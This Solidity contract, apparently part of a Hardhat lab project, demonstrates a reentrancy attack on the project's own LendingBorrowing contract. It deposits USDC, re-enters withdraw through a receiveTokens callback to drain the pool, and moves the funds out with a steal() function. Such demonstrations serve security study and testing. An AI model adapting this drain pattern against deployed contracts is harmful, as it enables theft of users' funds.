// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "../LendingBorrowing.sol";

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "hardhat/console.sol";

contract AttackContract {
    IERC20 private s_usdc;
    LendingBorrowing private lendingBorrowing;
    address private owner;

    constructor(address _usdcAddress, address _lendingBorrowingAddress) {
        s_usdc = IERC20(_usdcAddress);
        lendingBorrowing = LendingBorrowing(_lendingBorrowingAddress);
        owner = msg.sender;
    }

    function attack(uint256 amount) public {
        // Deposits tokens to the LendingBorrowing contract
        s_usdc.approve(address(lendingBorrowing), amount);
        lendingBorrowing.deposit(amount);

        // Run the attack to exploit re-entrency in withdraw function
        lendingBorrowing.withdraw(amount);
    }

    // This is the function that gets called recursively by the withdraw function
    function receiveTokens(address sender, uint256 amount) public {
        uint256 balance = s_usdc.balanceOf(address(lendingBorrowing));
        console.log("balance: %s", balance);

        if (balance > amount) {
            console.log("reentry");
            lendingBorrowing.withdraw(amount);
        }
    }

    // fallback() external payable {
    //     console.log("Fallback called");
    //     if (address(lendingBorrowing).balance >= msg.value) {
    //         lendingBorrowing.withdraw(msg.value);
    //     }
    // }

    // The owner of the contract withdraw the stolen funds
    function steal() public {
        s_usdc.transfer(msg.sender, s_usdc.balanceOf(address(this)));
    }
}
